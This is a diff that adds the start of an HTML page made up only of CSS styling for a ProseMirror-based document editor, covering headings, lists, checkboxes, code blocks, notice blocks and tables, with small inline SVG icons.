@@ -1,0 +1,710 @@
+<!DOCTYPE html><html><head><style data-styled="true" data-styled-version="5.3.0">.gYUIkd{-webkit-box-flex:0;-webkit-flex-grow:0;-ms-flex-positive:0;flex-grow:0;-webkit-box-pack:start;-webkit-justify-content:start;-ms-flex-pack:start;justify-content:start;color:#111319;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,'Open Sans','Helvetica Neue',sans-serif;font-weight:400;font-size:1em;line-height:1.6em;width:100%;}/*!sc*/
+.gYUIkd .mention{background:#EDF2F7;border-radius:8px;padding-bottom:2px;padding-top:1px;padding-left:4px;padding-right:4px;font-weight:500;font-size:0.9em;}/*!sc*/
+.gYUIkd > div{background:transparent;}/*!sc*/
+.gYUIkd *{box-sizing:content-box;}/*!sc*/
+.gYUIkd .ProseMirror{position:relative;outline:none;word-wrap:break-word;white-space:pre-wrap;white-space:break-spaces;-webkit-font-variant-ligatures:none;font-variant-ligatures:none;font-feature-settings:"liga" 0;padding:initial;margin:initial;}/*!sc*/
+.gYUIkd .ProseMirror > .ProseMirror-yjs-cursor{display:none;}/*!sc*/
+.gYUIkd .ProseMirror > *{margin-top:.5em;margin-bottom:.5em;}/*!sc*/
+.gYUIkd .ProseMirror > *:last-child{margin-bottom:0;}/*!sc*/
+.gYUIkd .ProseMirror > :first-child,.gYUIkd .ProseMirror > button:first-child + *{margin-top:0;}/*!sc*/
+.gYUIkd .ProseMirror h2,.gYUIkd .ProseMirror h3,.gYUIkd .ProseMirror h4,.gYUIkd .ProseMirror h5,.gYUIkd .ProseMirror h6{margin-top:1em;}/*!sc*/
+.gYUIkd .ProseMirror h1{margin-top:.75em;margin-bottom:0.25em;}/*!sc*/
+.gYUIkd .ProseMirror h1{font-size:1.75em;}/*!sc*/
+.gYUIkd .ProseMirror h2{font-size:1.25em;}/*!sc*/
+.gYUIkd .ProseMirror h3{font-size:1em;}/*!sc*/
+.gYUIkd .ProseMirror h4{font-size:0.875em;}/*!sc*/
+.gYUIkd .ProseMirror h5{font-size:0.75em;}/*!sc*/
+.gYUIkd .ProseMirror h6{font-size:0.75em;}/*!sc*/
+.gYUIkd .ProseMirror .ProseMirror-yjs-cursor{position:relative;margin-left:-1px;margin-right:-1px;border-left:1px solid black;border-right:1px solid black;height:1em;word-break:normal;}/*!sc*/
+.gYUIkd .ProseMirror .ProseMirror-yjs-cursor:after{content:"";display:block;position:absolute;left:-8px;right:-8px;top:0;bottom:0;}/*!sc*/
+.gYUIkd .ProseMirror .ProseMirror-yjs-cursor > div{opacity:0;-webkit-transition:opacity 100ms ease-in-out;transition:opacity 100ms ease-in-out;position:absolute;top:-1.8em;font-size:13px;background-color:rgb(250,129,0);font-style:normal;line-height:normal;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;white-space:nowrap;color:white;padding:2px 6px;font-weight:500;border-radius:4px;pointer-events:none;left:-1px;}/*!sc*/
+.gYUIkd .ProseMirror .ProseMirror-yjs-cursor:hover > div{opacity:1;}/*!sc*/
+.gYUIkd.show-cursor-names .ProseMirror-yjs-cursor > div{opacity:1;}/*!sc*/
+.gYUIkd pre{white-space:pre-wrap;}/*!sc*/
+.gYUIkd li{position:relative;}/*!sc*/
+.gYUIkd .image{line-height:0;text-align:center;max-width:100%;clear:both;position:relative;z-index:1;}/*!sc*/
+.gYUIkd .image img{pointer-events:none;display:inline-block;max-width:100%;}/*!sc*/
+.gYUIkd .image .ProseMirror-selectednode img{pointer-events:initial;}/*!sc*/
+.gYUIkd .image.placeholder{position:relative;background:#FFFFFF;margin-bottom:calc(28px + 1.2em);}/*!sc*/
+.gYUIkd .image.placeholder img{opacity:0.5;}/*!sc*/
+.gYUIkd .image-replacement-uploading img{opacity:0.5;}/*!sc*/
+.gYUIkd .image-right-50{float:right;width:33.3%;margin-left:2em;margin-bottom:1em;clear:initial;}/*!sc*/
+.gYUIkd .image-left-50{float:left;width:33.3%;margin-right:2em;margin-bottom:1em;clear:initial;}/*!sc*/
+.gYUIkd .image-full-width{width:initial;max-width:100vw;clear:both;position:initial;margin-left:var(--offset);}/*!sc*/
+.gYUIkd .image-full-width img{max-width:100vw;max-height:50vh;object-fit:cover;object-position:center;}/*!sc*/
+.gYUIkd .ProseMirror-hideselection *::selection{background:transparent;}/*!sc*/
+.gYUIkd .ProseMirror-hideselection *::-moz-selection{background:transparent;}/*!sc*/
+.gYUIkd .ProseMirror-hideselection{caret-color:transparent;}/*!sc*/
+.gYUIkd .ProseMirror-selectednode{outline:2px solid #0366d6;}/*!sc*/
+.gYUIkd li.ProseMirror-selectednode{outline:none;}/*!sc*/
+.gYUIkd li.ProseMirror-selectednode:after{content:"";position:absolute;left:-32px;right:-2px;top:-2px;bottom:-2px;border:2px solid #0366d6;pointer-events:none;}/*!sc*/
+.gYUIkd img.ProseMirror-separator{display:inline;border:none !important;margin:0 !important;}/*!sc*/
+.gYUIkd .component-image + img.ProseMirror-separator,.gYUIkd .component-image + img.ProseMirror-separator + br.ProseMirror-trailingBreak{display:none;}/*!sc*/
+.gYUIkd .ProseMirror[contenteditable="false"] .caption{pointer-events:none;}/*!sc*/
+.gYUIkd .ProseMirror[contenteditable="false"] .caption:empty{visibility:hidden;}/*!sc*/
+.gYUIkd h1,.gYUIkd h2,.gYUIkd h3,.gYUIkd h4,.gYUIkd h5,.gYUIkd h6{font-weight:500;cursor:text;}/*!sc*/
+.gYUIkd h1:not(.placeholder):before,.gYUIkd h2:not(.placeholder):before,.gYUIkd h3:not(.placeholder):before,.gYUIkd h4:not(.placeholder):before,.gYUIkd h5:not(.placeholder):before,.gYUIkd h6:not(.placeholder):before{display:inline-block;font-family:'SFMono-Regular',Consolas,'Liberation Mono',Menlo,Courier,monospace;color:#394351;font-size:13px;line-height:0;margin-left:-24px;-webkit-transition:opacity 150ms ease-in-out;transition:opacity 150ms ease-in-out;opacity:0;width:24px;}/*!sc*/
+.gYUIkd h1:hover .heading-actions,.gYUIkd h2:hover .heading-actions,.gYUIkd h3:hover .heading-actions,.gYUIkd h4:hover .heading-actions,.gYUIkd h5:hover .heading-actions,.gYUIkd h6:hover .heading-actions,.gYUIkd h1:focus-within .heading-actions,.gYUIkd h2:focus-within .heading-actions,.gYUIkd h3:focus-within .heading-actions,.gYUIkd h4:focus-within .heading-actions,.gYUIkd h5:focus-within .heading-actions,.gYUIkd h6:focus-within .heading-actions{opacity:1;}/*!sc*/
+.gYUIkd .heading-content:before{content:"​";display:inline;}/*!sc*/
+.gYUIkd .heading-name{color:#111319;pointer-events:none;display:block;position:relative;top:-60px;visibility:hidden;}/*!sc*/
+.gYUIkd .heading-name:hover{-webkit-text-decoration:none;text-decoration:none;}/*!sc*/
+.gYUIkd .heading-name:first-child + h1,.gYUIkd .heading-name:first-child + .ProseMirror-yjs-cursor + h1,.gYUIkd .heading-name:first-child + h2,.gYUIkd .heading-name:first-child + .ProseMirror-yjs-cursor + h2,.gYUIkd .heading-name:first-child + h3,.gYUIkd .heading-name:first-child + .ProseMirror-yjs-cursor + h3,.gYUIkd .heading-name:first-child + h4,.gYUIkd .heading-name:first-child + .ProseMirror-yjs-cursor + h4{margin-top:0;}/*!sc*/
+.gYUIkd a:first-child h1,.gYUIkd a:first-child h2,.gYUIkd a:first-child h3,.gYUIkd a:first-child h4,.gYUIkd a:first-child h5,.gYUIkd a:first-child h6{margin-top:0;}/*!sc*/
+.gYUIkd h1:not(.placeholder):before{content:"H1";}/*!sc*/
+.gYUIkd h2:not(.placeholder):before{content:"H2";}/*!sc*/
+.gYUIkd h3:not(.placeholder):before{content:"H3";}/*!sc*/
+.gYUIkd h4:not(.placeholder):before{content:"H4";}/*!sc*/
+.gYUIkd h5:not(.placeholder):before{content:"H5";}/*!sc*/
+.gYUIkd h6:not(.placeholder):before{content:"H6";}/*!sc*/
+.gYUIkd .ProseMirror[contenteditable="true"]:focus-within h1:not(.placeholder):before,.gYUIkd .ProseMirror-focused h1:not(.placeholder):before,.gYUIkd .ProseMirror[contenteditable="true"]:focus-within h2:not(.placeholder):before,.gYUIkd .ProseMirror-focused h2:not(.placeholder):before,.gYUIkd .ProseMirror[contenteditable="true"]:focus-within h3:not(.placeholder):before,.gYUIkd .ProseMirror-focused h3:not(.placeholder):before,.gYUIkd .ProseMirror[contenteditable="true"]:focus-within h4:not(.placeholder):before,.gYUIkd .ProseMirror-focused h4:not(.placeholder):before,.gYUIkd .ProseMirror[contenteditable="true"]:focus-within h5:not(.placeholder):before,.gYUIkd .ProseMirror-focused h5:not(.placeholder):before,.gYUIkd .ProseMirror[contenteditable="true"]:focus-within h6:not(.placeholder):before,.gYUIkd .ProseMirror-focused h6:not(.placeholder):before{opacity:1;}/*!sc*/
+.gYUIkd .with-emoji{margin-left:-1em;}/*!sc*/
+.gYUIkd .heading-anchor,.gYUIkd .heading-fold{display:inline-block;color:#111319;opacity:.75;cursor:var(--pointer);background:none;outline:none;border:0;margin:0;padding:0;text-align:left;font-family:'SFMono-Regular',Consolas,'Liberation Mono',Menlo,Courier,monospace;font-size:14px;line-height:0;width:12px;height:24px;}/*!sc*/
+.gYUIkd .heading-anchor:focus,.gYUIkd .heading-fold:focus,.gYUIkd .heading-anchor:hover,.gYUIkd .heading-fold:hover{opacity:1;}/*!sc*/
+.gYUIkd .heading-anchor{box-sizing:border-box;}/*!sc*/
+.gYUIkd .heading-actions{opacity:0;background:#FFFFFF;margin-left:-26px;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;position:relative;top:-2px;width:26px;height:24px;}/*!sc*/
+.gYUIkd .heading-actions.collapsed{opacity:1;}/*!sc*/
+.gYUIkd .heading-actions.collapsed .heading-anchor{opacity:0;}/*!sc*/
+.gYUIkd .heading-actions.collapsed .heading-fold{opacity:1;}/*!sc*/
+.gYUIkd h1:hover .heading-anchor,.gYUIkd h2:hover .heading-anchor,.gYUIkd h3:hover .heading-anchor,.gYUIkd h4:hover .heading-anchor,.gYUIkd h5:hover .heading-anchor,.gYUIkd h6:hover .heading-anchor{opacity:0.75 !important;}/*!sc*/
+.gYUIkd h1:hover .heading-anchor:hover,.gYUIkd h2:hover .heading-anchor:hover,.gYUIkd h3:hover .heading-anchor:hover,.gYUIkd h4:hover .heading-anchor:hover,.gYUIkd h5:hover .heading-anchor:hover,.gYUIkd h6:hover .heading-anchor:hover{opacity:1 !important;}/*!sc*/
+.gYUIkd .heading-fold{display:inline-block;-webkit-transform-origin:center;-ms-transform-origin:center;transform-origin:center;padding:0;}/*!sc*/
+.gYUIkd .heading-fold.collapsed{-webkit-transition-delay:0.1s;transition-delay:0.1s;opacity:1;}/*!sc*/
+.gYUIkd .heading-fold.collapsed svg{-webkit-transform:rotate(-90deg);-ms-transform:rotate(-90deg);transform:rotate(-90deg);pointer-events:none;}/*!sc*/
+.gYUIkd .placeholder:before{display:block;opacity:0;-webkit-transition:opacity 150ms ease-in-out;transition:opacity 150ms ease-in-out;content:attr(data-empty-text);pointer-events:none;height:0;color:#a2b2c3;}/*!sc*/
+.gYUIkd .ProseMirror-focused .placeholder:before,.gYUIkd .placeholder:nth-child(1):before,.gYUIkd .placeholder:nth-child(2):before{opacity:1;}/*!sc*/
+.gYUIkd .comment-marker{border-bottom:2px solid rgba(43,194,255,0.5);-webkit-transition:background 100ms ease-in-out;transition:background 100ms ease-in-out;border-radius:2px;}/*!sc*/
+.gYUIkd .comment-marker:hover{background:rgba(43,194,255,0.5);}/*!sc*/
+.gYUIkd .notice-block{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;background:rgba(54,51,255,0.1);border-left:4px solid #3633FF;color:#111319;border-radius:4px;padding:8px 10px 8px 8px;margin:8px 0;}/*!sc*/
+.gYUIkd .notice-block a{color:#111319;}/*!sc*/
+.gYUIkd .notice-block a:not(.heading-name){-webkit-text-decoration:underline;text-decoration:underline;}/*!sc*/
+.gYUIkd .notice-block p:first-child{margin-top:0;}/*!sc*/
+.gYUIkd .notice-block p:last-child{margin-bottom:0;}/*!sc*/
+.gYUIkd .notice-block .content{-webkit-box-flex:1;-webkit-flex-grow:1;-ms-flex-positive:1;flex-grow:1;min-width:0;}/*!sc*/
+.gYUIkd .notice-block .icon{width:24px;height:24px;-webkit-align-self:flex-start;-ms-flex-item-align:start;align-self:flex-start;margin-right:4px;color:#3633FF;}/*!sc*/
+.gYUIkd .notice-block.tip{background:rgba(245,190,49,0.1);border-left:4px solid #F5BE31;color:#111319;}/*!sc*/
+.gYUIkd .notice-block.tip .icon{color:#F5BE31;}/*!sc*/
+.gYUIkd .notice-block.tip a{color:#111319;}/*!sc*/
+.gYUIkd .notice-block.warning{background:rgba(215,58,73,0.1);border-left:4px solid #d73a49;color:#111319;}/*!sc*/
+.gYUIkd .notice-block.warning .icon{color:#d73a49;}/*!sc*/
+.gYUIkd .notice-block.warning a{color:#111319;}/*!sc*/
+.gYUIkd .notice-block.success{background:rgba(58,217,132,0.1);border-left:4px solid #3ad984;color:#111319;}/*!sc*/
+.gYUIkd .notice-block.success .icon{color:#3ad984;}/*!sc*/
+.gYUIkd .notice-block.success a{color:#111319;}/*!sc*/
+.gYUIkd blockquote{margin:0;padding:8px 10px 8px 1.5em;font-style:italic;overflow:hidden;position:relative;}/*!sc*/
+.gYUIkd blockquote:before{content:"";display:inline-block;width:2px;border-radius:1px;position:absolute;margin-left:-1.5em;top:0;bottom:0;background:#DAE1E9;}/*!sc*/
+.gYUIkd b,.gYUIkd strong{font-weight:600;}/*!sc*/
+.gYUIkd .template-placeholder{color:#a2b2c3;border-bottom:1px dotted #a2b2c3;border-radius:2px;cursor:text;}/*!sc*/
+.gYUIkd .template-placeholder:hover{border-bottom:1px dotted #394351;}/*!sc*/
+.gYUIkd p{margin:0;min-height:1.6em;}/*!sc*/
+.gYUIkd .heading-content a,.gYUIkd p a{color:#111319;-webkit-text-decoration:underline;text-decoration:underline;-webkit-text-decoration-color:#808aa9;text-decoration-color:#808aa9;-webkit-text-decoration-thickness:1px;text-decoration-thickness:1px;text-underline-offset:.15em;font-weight:500;}/*!sc*/
+.gYUIkd .heading-content a:hover,.gYUIkd p a:hover{-webkit-text-decoration:underline;text-decoration:underline;-webkit-text-decoration-color:#111319;text-decoration-color:#111319;-webkit-text-decoration-thickness:1px;text-decoration-thickness:1px;}/*!sc*/
+.gYUIkd a{color:#0366d6;cursor:pointer;}/*!sc*/
+.gYUIkd .ProseMirror-focused a{cursor:text;}/*!sc*/
+.gYUIkd a:hover{-webkit-text-decoration:none;text-decoration:none;}/*!sc*/
+.gYUIkd ul,.gYUIkd ol{margin:0 0.1em 0 -26px;padding:0 0 0 48px;}/*!sc*/
+.gYUIkd ol ol{list-style:lower-alpha;}/*!sc*/
+.gYUIkd ol ol ol{list-style:lower-roman;}/*!sc*/
+.gYUIkd ul.checkbox_list{padding:0;margin-left:-24px;margin-right:0;}/*!sc*/
+.gYUIkd ul li,.gYUIkd ol li{position:relative;white-space:initial;}/*!sc*/
+.gYUIkd ul li p,.gYUIkd ol li p{white-space:pre-wrap;}/*!sc*/
+.gYUIkd ul li > div,.gYUIkd ol li > div{width:100%;}/*!sc*/
+.gYUIkd ul.checkbox_list > li{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;list-style:none;padding-left:24px;}/*!sc*/
+.gYUIkd ul.checkbox_list > li.checked > div > p{color:#9BA6B2;}/*!sc*/
+.gYUIkd ul li::before,.gYUIkd ol li::before{background:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3QgeD0iOCIgeT0iNyIgd2lkdGg9IjMiIGhlaWdodD0iMiIgcng9IjEiIGZpbGw9IiM0RTVDNkUiLz4KPHJlY3QgeD0iOCIgeT0iMTEiIHdpZHRoPSIzIiBoZWlnaHQ9IjIiIHJ4PSIxIiBmaWxsPSIjNEU1QzZFIi8+CjxyZWN0IHg9IjgiIHk9IjE1IiB3aWR0aD0iMyIgaGVpZ2h0PSIyIiByeD0iMSIgZmlsbD0iIzRFNUM2RSIvPgo8cmVjdCB4PSIxMyIgeT0iNyIgd2lkdGg9IjMiIGhlaWdodD0iMiIgcng9IjEiIGZpbGw9IiM0RTVDNkUiLz4KPHJlY3QgeD0iMTMiIHk9IjExIiB3aWR0aD0iMyIgaGVpZ2h0PSIyIiByeD0iMSIgZmlsbD0iIzRFNUM2RSIvPgo8cmVjdCB4PSIxMyIgeT0iMTUiIHdpZHRoPSIzIiBoZWlnaHQ9IjIiIHJ4PSIxIiBmaWxsPSIjNEU1QzZFIi8+Cjwvc3ZnPgo=") no-repeat;background-position:0 2px;content:"";display:inline-block;cursor:-webkit-grab;cursor:-moz-grab;cursor:grab;width:24px;height:24px;position:absolute;left:-40px;opacity:0;-webkit-transition:opacity 200ms ease-in-out;transition:opacity 200ms ease-in-out;}/*!sc*/
+.gYUIkd ul li[draggable=true]::before,.gYUIkd ol li[draggable=true]::before{cursor:-webkit-grabbing;cursor:-moz-grabbing;cursor:grabbing;}/*!sc*/
+.gYUIkd ul > li.counter-2::before,.gYUIkd ol li.counter-2::before{left:-50px;}/*!sc*/
+.gYUIkd ul > li.hovering::before,.gYUIkd ol li.hovering::before{opacity:0.5;}/*!sc*/
+.gYUIkd ul li.ProseMirror-selectednode::after,.gYUIkd ol li.ProseMirror-selectednode::after{display:none;}/*!sc*/
+.gYUIkd ul.checkbox_list > li::before{left:0;}/*!sc*/
+.gYUIkd ul.checkbox_list li .checkbox{display:inline-block;cursor:var(--pointer);pointer-events:initial;opacity:1;margin:0 0.5em 0 0;width:14px;height:14px;position:relative;top:1px;-webkit-transition:-webkit-transform 100ms ease-in-out;-webkit-transition:transform 100ms ease-in-out;transition:transform 100ms ease-in-out;opacity:.8;background-image:url("data:image/svg+xml,%3Csvg width='14' height='14' viewBox='0 0 14 14' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M3 0C1.34315 0 0 1.34315 0 3V11C0 12.6569 1.34315 14 3 14H11C12.6569 14 14 12.6569 14 11V3C14 1.34315 12.6569 0 11 0H3ZM3 2C2.44772 2 2 2.44772 2 3V11C2 11.5523 2.44772 12 3 12H11C11.5523 12 12 11.5523 12 11V3C12 2.44772 11.5523 2 11 2H3Z' fill='%23111319' /%3E%3C/svg%3E%0A");}/*!sc*/
+.gYUIkd ul.checkbox_list li .checkbox[aria-checked=true]{opacity:1;background-image:url( "data:image/svg+xml,%3Csvg width='14' height='14' viewBox='0 0 14 14' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M3 0C1.34315 0 0 1.34315 0 3V11C0 12.6569 1.34315 14 3 14H11C12.6569 14 14 12.6569 14 11V3C14 1.34315 12.6569 0 11 0H3ZM4.26825 5.85982L5.95873 7.88839L9.70003 2.9C10.0314 2.45817 10.6582 2.36863 11.1 2.7C11.5419 3.03137 11.6314 3.65817 11.3 4.1L6.80002 10.1C6.41275 10.6164 5.64501 10.636 5.2318 10.1402L2.7318 7.14018C2.37824 6.71591 2.43556 6.08534 2.85984 5.73178C3.28412 5.37821 3.91468 5.43554 4.26825 5.85982Z' fill='%230366d6' /%3E%3C/svg%3E%0A" );}/*!sc*/
+.gYUIkd ul.checkbox_list li .checkbox:active{-webkit-transform:scale(0.9);-ms-transform:scale(0.9);transform:scale(0.9);}/*!sc*/
+.gYUIkd li p:first-child{margin:0;word-break:break-word;}/*!sc*/
+.gYUIkd hr{position:relative;height:1em;border:0;}/*!sc*/
+.gYUIkd hr:before{content:"";display:block;position:absolute;border-top:1px solid #E8EBED;top:0.5em;left:0;right:0;}/*!sc*/
+.gYUIkd hr.page-break{page-break-after:always;}/*!sc*/
+.gYUIkd hr.page-break:before{border-top:1px dashed #E8EBED;}/*!sc*/
+.gYUIkd .math-inline .math-src .ProseMirror,.gYUIkd code{border-radius:4px;border:1px solid #E8EBED;background:#F4F7FA;padding:3px 4px;font-family:'SFMono-Regular',Consolas,'Liberation Mono',Menlo,Courier,monospace;font-size:90%;}/*!sc*/
+.gYUIkd mark{border-radius:1px;color:#111319;background:#FDEA9B;}/*!sc*/
+.gYUIkd mark a{color:#111319;}/*!sc*/
+.gYUIkd .external-link{cursor:pointer;display:inline-block;position:relative;top:2px;width:16px;height:16px;}/*!sc*/
+.gYUIkd .code-actions,.gYUIkd .notice-actions{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;gap:8px;position:absolute;z-index:1;top:8px;right:8px;}/*!sc*/
+.gYUIkd .notice-actions{right:8px;}/*!sc*/
+.gYUIkd .code-block,.gYUIkd .notice-block{position:relative;}/*!sc*/
+.gYUIkd .code-block select,.gYUIkd .notice-block select,.gYUIkd .code-block button,.gYUIkd .notice-block button{margin:0;padding:0;border:0;background:#FFFFFF;color:#111319;box-shadow:rgba(0,0,0,0.07) 0px 1px 2px,#d9d9d9 0 0 0 1px inset;border-radius:4px;font-size:13px;font-weight:500;-webkit-text-decoration:none;text-decoration:none;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;cursor:var(--pointer);-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-appearance:none !important;-moz-appearance:none !important;appearance:none !important;padding:6px 8px;display:none;}/*!sc*/
+.gYUIkd .code-block select::-moz-focus-inner,.gYUIkd .notice-block select::-moz-focus-inner,.gYUIkd .code-block button::-moz-focus-inner,.gYUIkd .notice-block button::-moz-focus-inner{padding:0;border:0;}/*!sc*/
+.gYUIkd .code-block select:hover:not(:disabled),.gYUIkd .notice-block select:hover:not(:disabled),.gYUIkd .code-block button:hover:not(:disabled),.gYUIkd .notice-block button:hover:not(:disabled){background-color:#f2f2f2;box-shadow:rgba(0,0,0,0.07) 0px 1px 2px,#d9d9d9 0 0 0 1px inset;}/*!sc*/
+.gYUIkd .code-block select,.gYUIkd .notice-block select{background-image:url('data:image/svg+xml;utf8,<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"> <path fill-rule="evenodd" clip-rule="evenodd" d="M9.03087 9C8.20119 9 7.73238 9.95209 8.23824 10.6097L11.2074 14.4696C11.6077 14.99 12.3923 14.99 12.7926 14.4696L15.7618 10.6097C16.2676 9.95209 15.7988 9 14.9691 9L9.03087 9Z" fill="currentColor"/> </svg>');background-repeat:no-repeat;background-position:center right;padding-right:20px;}/*!sc*/
+.gYUIkd .code-block:focus-within select,.gYUIkd .notice-block:focus-within select,.gYUIkd .code-block:hover select,.gYUIkd .notice-block:hover select{display:inline;}/*!sc*/
+.gYUIkd .code-block:focus-within button,.gYUIkd .notice-block:focus-within button,.gYUIkd .code-block:hover button,.gYUIkd .notice-block:hover button{display:inline;}/*!sc*/
+.gYUIkd .code-block select:focus,.gYUIkd .notice-block select:focus,.gYUIkd .code-block select:active,.gYUIkd .notice-block select:active,.gYUIkd .code-block button:focus,.gYUIkd .notice-block button:focus,.gYUIkd .code-block button:active,.gYUIkd .notice-block button:active{display:inline;}/*!sc*/
+.gYUIkd .code-block button.show-source-button,.gYUIkd .notice-block button.show-source-button{display:none;}/*!sc*/
+.gYUIkd .code-block button.show-diagram-button,.gYUIkd .notice-block button.show-diagram-button{display:inline;}/*!sc*/
+.gYUIkd .code-block.code-hidden button,.gYUIkd .notice-block.code-hidden button,.gYUIkd .code-block.code-hidden select,.gYUIkd .notice-block.code-hidden select,.gYUIkd .code-block.code-hidden button.show-diagram-button,.gYUIkd .notice-block.code-hidden button.show-diagram-button{display:none;}/*!sc*/
+.gYUIkd .code-block.code-hidden button.show-source-button,.gYUIkd .notice-block.code-hidden button.show-source-button{display:inline;}/*!sc*/
+.gYUIkd .code-block.code-hidden pre,.gYUIkd .notice-block.code-hidden pre{display:none;}/*!sc*/
+.gYUIkd .code-block.with-line-numbers pre{padding-left:calc(var(--line-number-gutter-width,0) * 1em + 1.5em);}/*!sc*/
+.gYUIkd .code-block.with-line-numbers:after{content:attr(data-line-numbers);position:absolute;padding-left:1em;left:0;top:calc(1px + 0.75em);width:calc(var(--line-number-gutter-width,0) * 1em + .25em);word-break:break-all;white-space:break-spaces;font-family:'SFMono-Regular',Consolas,'Liberation Mono',Menlo,Courier,monospace;font-size:13px;line-height:1.4em;color:#9BA6B2;background:#F4F7FA;text-align:right;font-variant-numeric:tabular-nums;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;}/*!sc*/
+.gYUIkd .mermaid-diagram-wrapper{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;background:#F4F7FA;border-radius:6px;border:1px solid #E8EBED;padding:8px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;cursor:default;}/*!sc*/
+.gYUIkd .mermaid-diagram-wrapper *{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,'Open Sans','Helvetica Neue',sans-serif;}/*!sc*/
+.gYUIkd .mermaid-diagram-wrapper.diagram-hidden{display:none;}/*!sc*/
+.gYUIkd pre{display:block;overflow-x:auto;padding:0.75em 1em;line-height:1.4em;position:relative;background:#F4F7FA;border-radius:4px;border:1px solid #E8EBED;margin:.5em 0;-webkit-font-smoothing:initial;font-family:'SFMono-Regular',Consolas,'Liberation Mono',Menlo,Courier,monospace;font-size:13px;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;color:#2F3336;}/*!sc*/
+.gYUIkd pre code{font-size:13px;background:none;padding:0;border:0;}/*!sc*/
+.gYUIkd .token.comment,.gYUIkd .token.prolog,.gYUIkd .token.doctype,.gYUIkd .token.cdata{color:#6a737d;}/*!sc*/
+.gYUIkd .token.punctuation{color:#5e6687;}/*!sc*/
+.gYUIkd .token.namespace{opacity:0.7;}/*!sc*/
+.gYUIkd .token.operator,.gYUIkd .token.boolean,.gYUIkd .token.number{color:#d73a49;}/*!sc*/
+.gYUIkd .token.property{color:#c08b30;}/*!sc*/
+.gYUIkd .token.tag{color:#3d8fd1;}/*!sc*/
+.gYUIkd .token.string{color:#032f62;}/*!sc*/
+.gYUIkd .token.selector{color:#6679cc;}/*!sc*/
+.gYUIkd .token.attr-name{color:#c76b29;}/*!sc*/
+.gYUIkd .token.entity,.gYUIkd .token.url,.gYUIkd .language-css .token.string,.gYUIkd .style .token.string{color:#22a2c9;}/*!sc*/
+.gYUIkd .token.attr-value,.gYUIkd .token.keyword,.gYUIkd .token.control,.gYUIkd .token.directive,.gYUIkd .token.unit{color:#d73a49;}/*!sc*/
+.gYUIkd .token.function{color:#6f42c1;}/*!sc*/
+.gYUIkd .token.statement,.gYUIkd .token.regex,.gYUIkd .token.atrule{color:#22a2c9;}/*!sc*/
+.gYUIkd .token.placeholder,.gYUIkd .token.variable{color:#3d8fd1;}/*!sc*/
+.gYUIkd .token.deleted{-webkit-text-decoration:line-through;text-decoration:line-through;}/*!sc*/
+.gYUIkd .token.inserted{border-bottom:1px dotted #202746;-webkit-text-decoration:none;text-decoration:none;}/*!sc*/
+.gYUIkd .token.italic{font-style:italic;}/*!sc*/
+.gYUIkd .token.important,.gYUIkd .token.bold{font-weight:bold;}/*!sc*/
+.gYUIkd .token.important{color:#c94922;}/*!sc*/
+.gYUIkd .token.entity{cursor:help;}/*!sc*/
+.gYUIkd table{width:100%;border-collapse:collapse;border-radius:4px;margin-top:1em;box-sizing:border-box;}/*!sc*/
+.gYUIkd table *{box-sizing:border-box;}/*!sc*/
+.gYUIkd table tr{position:relative;border-bottom:1px solid #E8EBED;}/*!sc*/
+.gYUIkd table th{background:transparent;}/*!sc*/
+.gYUIkd table td,.gYUIkd table th{position:relative;vertical-align:top;border:1px solid #E8EBED;position:relative;padding:4px 8px;text-align:left;min-width:100px;}/*!sc*/
+.gYUIkd table td .component-embed{padding:4px 0;}/*!sc*/
+.gYUIkd table .selectedCell{background:rgba(3,102,214,0.2);background-clip:padding-box;}/*!sc*/
+.gYUIkd table .grip-column::after{content:"";cursor:var(--pointer);position:absolute;top:-16px;left:0;width:100%;height:12px;background:#E8EBED;border-bottom:3px solid #FFFFFF;display:block;}/*!sc*/
+.gYUIkd table .grip-column:hover::after{background:#111319;}/*!sc*/
+.gYUIkd table .grip-column.first::after{border-top-left-radius:3px;}/*!sc*/
+.gYUIkd table .grip-column.last::after{border-top-right-radius:3px;}/*!sc*/
+.gYUIkd table .grip-column.selected::after{background:#0366d6;}/*!sc*/
+.gYUIkd table .grip-row::after{content:"";cursor:var(--pointer);position:absolute;left:-16px;top:0;height:100%;width:12px;background:#E8EBED;border-right:3px solid;border-color:#FFFFFF;display:block;}/*!sc*/
+.gYUIkd table .grip-row:hover::after{background:#111319;}/*!sc*/
+.gYUIkd table .grip-row.first::after{border-top-left-radius:3px;}/*!sc*/
+.gYUIkd table .grip-row.last::after{border-bottom-left-radius:3px;}/*!sc*/
+.gYUIkd table .grip-row.selected::after{background:#0366d6;}/*!sc*/
